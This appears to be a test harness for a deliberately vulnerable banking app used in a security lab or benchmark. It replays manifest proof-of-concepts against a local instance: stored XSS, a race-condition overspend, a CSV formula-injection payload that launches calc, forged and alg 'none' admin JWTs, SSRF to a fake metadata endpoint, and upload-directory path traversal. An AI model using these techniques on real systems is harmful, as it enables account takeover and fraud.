/* eslint-disable no-console */
/**
 * replay_poc.ts — replays a manifest PoC against a running vulnbank and decides
 * whether the vulnerability is present.
 *
 *   npx ts-node scripts/replay_poc.ts <VULN-ID> [--base http://127.0.0.1:4000]
 *   npx ts-node scripts/replay_poc.ts --all
 *
 * Exit code 0 = PoC reproduced (vulnerability present), 1 = not reproduced.
 */
import http from 'http';
import fs from 'fs';
import path from 'path';
import { execFileSync } from 'child_process';
// js-yaml ships no bundled types; it is present via the jest dependency tree.
// eslint-disable-next-line @typescript-eslint/no-var-requires
const yaml = require('js-yaml') as { load: (s: string) => unknown };
import crypto from 'crypto';
import jwt from 'jsonwebtoken';

const ROOT = path.resolve(__dirname, '..');
const MANIFEST_PATH = path.join(ROOT, 'manifest.yaml');

interface ManifestVuln {
  id: string;
  route: string;
  category: string;
  cwe: string;
  severity: string;
  location: { file: string; symbol?: string; lines: number[] };
  description: string;
  poc: {
    type: string;
    request?: string;
    repeat?: number;
    alt_body?: string;
    setup?: string;
    followup?: string;
    steps?: string;
    static_files?: string[];
    psql?: string;
    expect: string;
    expect_expr: string;
  };
  fix: { strategy: string; patch_file: string };
  tests_that_must_stay_green: string[];
}

interface RawResponse {
  status: number;
  headers: Record<string, string>;
  body: string;
}

interface Ctx {
  status: number;
  body: string;
  json: unknown;
  headers: Record<string, string>;
  text: string;
  static: Record<string, string>;
  psql: string;
  probe: Record<string, unknown>;
}

function loadManifest(): { version: number; vulns: ManifestVuln[] } {
  const text = fs.readFileSync(MANIFEST_PATH, 'utf8');
  const parsed = yaml.load(text) as { version: number; vulns: ManifestVuln[] };
  return { version: parsed.version, vulns: parsed.vulns };
}

function request(
  base: string,
  method: string,
  urlPath: string,
  headers: Record<string, string>,
  body: string,
): Promise<RawResponse> {
  return new Promise((resolve, reject) => {
    const u = new URL(urlPath, base);
    const payload = Buffer.from(body || '', 'utf8');
    const finalHeaders: Record<string, string> = { ...headers };
    if (body && !Object.keys(finalHeaders).some((h) => h.toLowerCase() === 'content-length')) {
      finalHeaders['Content-Length'] = String(payload.length);
    }
    const req = http.request(
      { hostname: u.hostname, port: u.port, path: u.pathname + u.search, method, headers: finalHeaders },
      (res) => {
        const chunks: Buffer[] = [];
        res.on('data', (c: Buffer) => chunks.push(c));
        res.on('end', () => {
          const flat: Record<string, string> = {};
          for (const [k, v] of Object.entries(res.headers)) {
            flat[k] = Array.isArray(v) ? v.join(', ') : String(v ?? '');
          }
          resolve({ status: res.statusCode || 0, headers: flat, body: Buffer.concat(chunks).toString('utf8') });
        });
      },
    );
    req.on('error', reject);
    if (payload.length) req.write(payload);
    req.end();
  });
}

function headers_looks_multipart(head: string): boolean {
  return /multipart\/form-data/i.test(head);
}

function parseRawRequest(raw: string): { method: string; path: string; headers: Record<string, string>; body: string } {
  // Normalise only line endings; multipart boundaries inside the body must stay CRLF.
  const normalized = raw;
  const splitAt = normalized.indexOf('\r\n\r\n') !== -1 ? normalized.indexOf('\r\n\r\n') : normalized.indexOf('\n\n');
  const sepLen = normalized.indexOf('\r\n\r\n') !== -1 ? 4 : 2;
  const head = splitAt === -1 ? normalized : normalized.slice(0, splitAt);
  let body = splitAt === -1 ? '' : normalized.slice(splitAt + sepLen);
  if (headers_looks_multipart(head)) {
    // RFC 7578 wants CRLF between parts; the manifest stores LF for YAML safety.
    body = body.replace(/\r?\n/g, '\r\n');
    if (!body.endsWith('\r\n')) body += '\r\n';
  } else if (body.endsWith('\n')) {
    body = body.slice(0, -1);
  }

  const lines = head.split(/\r?\n/).filter((l) => l.trim() !== '');
  const [method, urlPath] = lines[0].split(' ');
  const headers: Record<string, string> = {};
  for (const line of lines.slice(1)) {
    const idx = line.indexOf(':');
    if (idx === -1) continue;
    headers[line.slice(0, idx).trim()] = line.slice(idx + 1).trim();
  }
  return { method, path: urlPath, headers, body };
}

async function login(base: string, username: string, password: string): Promise<string> {
  const res = await request(
    base,
    'POST',
    '/api/auth/login',
    { 'Content-Type': 'application/json' },
    JSON.stringify({ username, password }),
  );
  const parsed = JSON.parse(res.body) as { token?: string };
  if (!parsed.token) throw new Error(`helper login failed for ${username}: ${res.status} ${res.body}`);
  return parsed.token;
}

function b64url(input: string): string {
  return Buffer.from(input, 'utf8').toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}

function decodeJwt(token: string): { header: Record<string, unknown>; payload: Record<string, unknown> } {
  const [h, p] = token.split('.');
  const pad = (s: string): string => s + '='.repeat((4 - (s.length % 4)) % 4);
  return {
    header: JSON.parse(Buffer.from(pad(h.replace(/-/g, '+').replace(/_/g, '/')), 'base64').toString('utf8')),
    payload: JSON.parse(Buffer.from(pad(p.replace(/-/g, '+').replace(/_/g, '/')), 'base64').toString('utf8')),
  };
}

/** Spins up a fake cloud-metadata endpoint so ssrf_metadata is provable locally. */
function startMetadataProbe(): Promise<{ port: number; close: () => Promise<void> }> {
  return new Promise((resolve) => {
    const server = http.createServer((req, res) => {
      res.writeHead(200, { 'content-type': 'text/plain' });
      res.end(
        `probe-path=${req.url}\n` +
          'ami-id=ami-0vulnbankprobe\n' +
          'iam-security-credentials/vulnbank-role={"AccessKeyId":"ASIAVULNBANKPROBE","SecretAccessKey":"probe"}\n',
      );
    });
    server.listen(0, '127.0.0.1', () => {
      const addr = server.address();
      const port = typeof addr === 'object' && addr ? addr.port : 0;
      resolve({ port, close: () => new Promise<void>((r) => server.close(() => r())) });
    });
  });
}

/** Percent-encoded `../` repeated enough times to walk out of the upload dir to /. */
function uploadEscape(): string {
  const uploadDir = process.env.UPLOAD_DIR || path.join(ROOT, 'uploads');
  const depth = path.resolve(uploadDir).split(path.sep).filter(Boolean).length;
  return encodeURIComponent('../').repeat(depth);
}

function substitute(value: string, probePort: number, base: string): string {
  return value
    .replaceAll('{{METADATA_PORT}}', String(probePort))
    .replaceAll('{{BASE}}', base)
    .replaceAll('{{UPLOAD_ESCAPE}}', uploadEscape())
    .replaceAll('{{NONCE}}', crypto.randomBytes(4).toString('hex'));
}

function runPsql(sql: string): string {
  const url =
    process.env.DATABASE_URL ||
    'postgresql://vulnbank:Sup3rS3cretBankPwd!@127.0.0.1:5432/vulnbank';
  try {
    return execFileSync('psql', [url, '-t', '-A', '-c', sql], { encoding: 'utf8', timeout: 15000 }).trim();
  } catch (err) {
    return `psql error: ${(err as Error).message}`;
  }
}

/** Split a CSV line into fields, honouring double-quoted cells. */
function csvFields(line: string): string[] {
  const fields: string[] = [];
  let current = '';
  let inQuotes = false;
  for (let i = 0; i < line.length; i += 1) {
    const ch = line[i];
    if (ch === '"') {
      if (inQuotes && line[i + 1] === '"') {
        current += '"';
        i += 1;
      } else {
        inQuotes = !inQuotes;
      }
    } else if (ch === ',' && !inQuotes) {
      fields.push(current);
      current = '';
    } else {
      current += ch;
    }
  }
  fields.push(current);
  return fields;
}

function median(values: number[]): number {
  if (values.length === 0) return 0;
  const sorted = [...values].sort((a, b) => a - b);
  const mid = Math.floor(sorted.length / 2);
  return sorted.length % 2 ? sorted[mid] : (sorted[mid - 1] + sorted[mid]) / 2;
}

function evaluateExpr(expr: string, ctx: Ctx): boolean {
  // The predicate is data from our own manifest, evaluated with only the ctx in scope.
  const fn = new Function(
    'csvFields',
    'ctx',
    `"use strict"; const {status, body, json, headers, text, static: stat, psql, probe} = ctx; return Boolean(${expr});`,
  );
  return fn(csvFields, ctx) === true;
}

export async function replay(id: string, base: string): Promise<{ id: string; reproduced: boolean; detail: string }> {
  const manifest = loadManifest();
  const vuln = manifest.vulns.find((v) => v.id === id);
  if (!vuln) return { id, reproduced: false, detail: `no manifest entry for ${id}` };

  const probe = await startMetadataProbe();
    let psqlOverride = '';
  const extra: Record<string, unknown> = { metadata_port: probe.port };

  try {
    // Multi-step PoCs (VULN-011 stored XSS, VULN-013 race) need setup requests.
    if (vuln.id === 'VULN-011') {
      const token = await login(base, 'alice', 'Alice!Passw0rd1');
      const put = await request(
        base,
        'PUT',
        '/api/users/2/profile',
        { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        JSON.stringify({ display_name: 'Alice', bio: '<script>alert(1)</script>', website: 'https://x.test' }),
      );
      extra.plant_status = put.status;
    }

    if (vuln.id === 'VULN-013') {
      const token = await login(base, 'alice', 'Alice!Passw0rd1');
      await runPsql(`UPDATE users SET balance = 200.00 WHERE username = 'alice'`);
      const bobId = Number(runPsql(`SELECT id FROM users WHERE username = 'bob'`));
      const before = Number(runPsql(`SELECT balance FROM users WHERE username = 'alice'`));
      const shots = await Promise.all(
        Array.from({ length: 8 }, () =>
          request(
            base,
            'POST',
            '/api/transactions',
            { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
            JSON.stringify({ to: bobId, amount: 150, note: 'race probe' }),
          ),
        ),
      );
      const accepted = shots.filter((s) => s.status === 201).length;
      const after = Number(runPsql(`SELECT balance FROM users WHERE username = 'alice'`));
      extra.accepted = accepted;
      extra.balance_before = before;
      extra.balance_after = after;
      extra.overspent = before - after > before;
      await runPsql(`UPDATE users SET balance = 2500.00 WHERE username = 'alice'`);
    }

    if (vuln.id === 'VULN-024') {
      const token = await login(base, 'alice', 'Alice!Passw0rd1');
      const bobId = Number(runPsql(`SELECT id FROM users WHERE username = 'bob'`));
      await request(
        base,
        'POST',
        '/api/transactions',
        { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` },
        JSON.stringify({ to: bobId, amount: 1, note: "=cmd|' /C calc'!A0" }),
      );
    }

    if (vuln.id === 'VULN-029') {
      const suffix = crypto.randomBytes(4).toString('hex');
      const username = `hashtest_${suffix}`;
      await request(
        base,
        'POST',
        '/api/auth/register',
        { 'Content-Type': 'application/json' },
        JSON.stringify({ username, password: 'Known!Password1', email: `${username}@vulnbank.test` }),
      );
      psqlOverride = `SELECT password FROM users WHERE username = '${username}'`;
    }

    const statics: Record<string, string> = {};
    for (const file of vuln.poc.static_files || []) {
      const abs = path.join(ROOT, file);
      statics[file] = fs.existsSync(abs) ? fs.readFileSync(abs, 'utf8') : '';
    }

    let psqlOut = '';
    if (psqlOverride) psqlOut = runPsql(psqlOverride);
    else if (vuln.poc.psql) psqlOut = runPsql(substitute(vuln.poc.psql, probe.port, base));

    if (vuln.poc.setup) {
      const setup = parseRawRequest(substitute(vuln.poc.setup, probe.port, base));
      const setupHeaders: Record<string, string> = { ...setup.headers };
      if (setupHeaders.Authorization === '{{ALICE_TOKEN}}') {
        setupHeaders.Authorization = `Bearer ${await login(base, 'alice', 'Alice!Passw0rd1')}`;
      }
      const setupRes = await request(base, setup.method, setup.path, setupHeaders, setup.body);
      extra.setup_status = setupRes.status;
    }

    let response: RawResponse;
    if (vuln.poc.request) {
      const parsed = parseRawRequest(substitute(vuln.poc.request, probe.port, base));
      const headers: Record<string, string> = { ...parsed.headers };
      if (headers.Authorization === '{{ALICE_TOKEN}}') {
        headers.Authorization = `Bearer ${await login(base, 'alice', 'Alice!Passw0rd1')}`;
      }
      if (headers.Authorization === '{{BOB_TOKEN}}') {
        headers.Authorization = `Bearer ${await login(base, 'bob', 'Bob!Passw0rd22')}`;
      }
      if (headers.Authorization === '{{ADMIN_TOKEN}}') {
        headers.Authorization = `Bearer ${await login(base, 'admin', 'Adm1n!Passw0rd')}`;
      }
      if (headers.Authorization === '{{FORGED_ADMIN_TOKEN}}') {
        // Signed with the secret that GET /api/config discloses (VULN-026).
        headers.Authorization = `Bearer ${jwt.sign(
          { sub: 1, username: 'admin', role: 'admin' },
          'vulnbank-dev-secret-do-not-ship',
        )}`;
      }
      if (headers.Authorization === '{{NONE_ALG_ADMIN_TOKEN}}') {
        const header = b64url(JSON.stringify({ alg: 'none', typ: 'JWT' }));
        const payload = b64url(JSON.stringify({ sub: 1, username: 'admin', role: 'admin' }));
        headers.Authorization = `Bearer ${header}.${payload}.`;
      }
      response = await request(base, parsed.method, parsed.path, headers, parsed.body);

      const repeat = Number(vuln.poc.repeat || 0);
      if (repeat > 0) {
        const runs: Array<{ status: number; ms: number; body: string }> = [];
        const altRaw = vuln.poc.alt_body;
        const altBody = altRaw ? substitute(altRaw, probe.port, base) : null;
        const altRuns: Array<{ status: number; ms: number; body: string }> = [];

        const timeOnce = async (body: string): Promise<{ status: number; ms: number; body: string }> => {
          const started = process.hrtime.bigint();
          const r = await request(base, parsed.method, parsed.path, headers, body);
          return { status: r.status, ms: Number(process.hrtime.bigint() - started) / 1e6, body: r.body };
        };

        // Warm up both paths before measuring.
        await timeOnce(parsed.body);
        if (altBody) await timeOnce(altBody);

        if (altBody) {
          // Interleave the two series so machine drift affects both equally.
          for (let i = 0; i < repeat; i += 1) {
            runs.push(await timeOnce(parsed.body));
            altRuns.push(await timeOnce(altBody));
          }
        } else {
          for (let i = 0; i < repeat; i += 1) runs.push(await timeOnce(parsed.body));
        }

        extra.runs = runs;
        extra.statuses = runs.map((r) => r.status);
        extra.median_ms = median(runs.map((r) => r.ms));
        extra.min_ms = Math.min(...runs.map((r) => r.ms));
        if (altRuns.length) {
          extra.alt_runs = altRuns;
          extra.alt_statuses = altRuns.map((r) => r.status);
          extra.alt_median_ms = median(altRuns.map((r) => r.ms));
          extra.alt_min_ms = Math.min(...altRuns.map((r) => r.ms));
        }
      }
    } else {
      response = { status: 0, headers: {}, body: '' };
    }

    if (vuln.poc.followup) {
      const follow = parseRawRequest(substitute(vuln.poc.followup, probe.port, base));
      const followHeaders: Record<string, string> = { ...follow.headers };
      if (followHeaders.Authorization === '{{ALICE_TOKEN}}') {
        followHeaders.Authorization = `Bearer ${await login(base, 'alice', 'Alice!Passw0rd1')}`;
      }
      const followRes = await request(base, follow.method, follow.path, followHeaders, follow.body);
      let followJson: unknown = null;
      try {
        followJson = JSON.parse(followRes.body);
      } catch {
        followJson = null;
      }
      extra.followup_status = followRes.status;
      extra.followup = followJson;
    }

    let json: unknown = null;
    try {
      json = JSON.parse(response.body);
    } catch {
      json = null;
    }

    const ctx: Ctx = {
      status: response.status,
      body: response.body,
      json,
      headers: response.headers,
      text: response.body,
      static: statics,
      psql: psqlOut,
      probe: extra,
    };

    if (process.env.REDFALL_POC_DEBUG) {
      console.error(`[debug ${vuln.id}] probe=${JSON.stringify(extra)}`);
    }

    const reproduced = evaluateExpr(vuln.poc.expect_expr, ctx);
    const detail = `status=${response.status} snippet=${JSON.stringify(response.body.slice(0, 160))}`;
    return { id, reproduced, detail };
  } catch (err) {
    return { id, reproduced: false, detail: `error: ${(err as Error).message}` };
  } finally {
    await probe.close();
  }
}

async function main(): Promise<void> {
  const args = process.argv.slice(2);
  let base = 'http://127.0.0.1:4000';
  const baseIdx = args.indexOf('--base');
  if (baseIdx !== -1 && args[baseIdx + 1]) base = args[baseIdx + 1];

  const manifest = loadManifest();
  const ids = args.includes('--all') ? manifest.vulns.map((v) => v.id) : args.filter((a) => !a.startsWith('--') && a !== base);

  if (ids.length === 0) {
    console.error('usage: replay_poc.ts <VULN-ID>|--all [--base URL]');
    process.exit(2);
  }

  let reproducedCount = 0;
  for (const id of ids) {
    const result = await replay(id, base);
    if (result.reproduced) reproducedCount += 1;
    console.log(`${result.reproduced ? 'REPRODUCED' : 'NOT-REPRODUCED'}  ${id}  ${result.detail}`);
  }
  console.log(`\n${reproducedCount}/${ids.length} PoC(s) reproduced`);
  process.exit(reproducedCount === ids.length ? 0 : 1);
}

if (require.main === module) {
  main();
}
